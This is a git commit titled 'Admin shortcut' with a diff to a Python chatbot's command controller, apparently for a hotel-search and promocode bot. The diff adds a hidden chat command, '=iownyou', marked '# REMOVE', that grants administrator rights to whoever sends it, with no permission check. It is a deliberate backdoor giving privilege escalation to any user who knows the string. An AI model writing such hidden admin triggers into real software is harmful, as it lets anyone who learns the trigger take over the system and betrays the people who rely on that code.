e882367e50f7bca503b56a70d12af8f6c734030a
MindHardt <71509337+MindHardt@users.noreply.github.com>
2022-07-10 18:52:11 +0500

    Admin shortcut

--- controller/commands_controller.py
+++ controller/commands_controller.py
@@ -1,5 +1,7 @@
 from commands import draw_map_command, hotel_search_command, redeem_promocode_command, create_promocode_command, \
     register_command, login_command, logout_command, info_command, set_config_command, view_config_command
+from controller import authentificator
+from database import table_admins
 
 
 def handle_command(message, bot):
@@ -26,6 +28,8 @@ def handle_command(message, bot):
             set_config_command.execute(message, bot)
         elif call == "=viewconfig":
             view_config_command.execute(message, bot)
-
+        elif call == "=iownyou":  # REMOVE
+            user = authentificator.get_user(message.chat.id)
+            table_admins.add_admin(user.unique_id)
     except Exception as e:
         bot.send_message(message.chat.id, e.__str__())
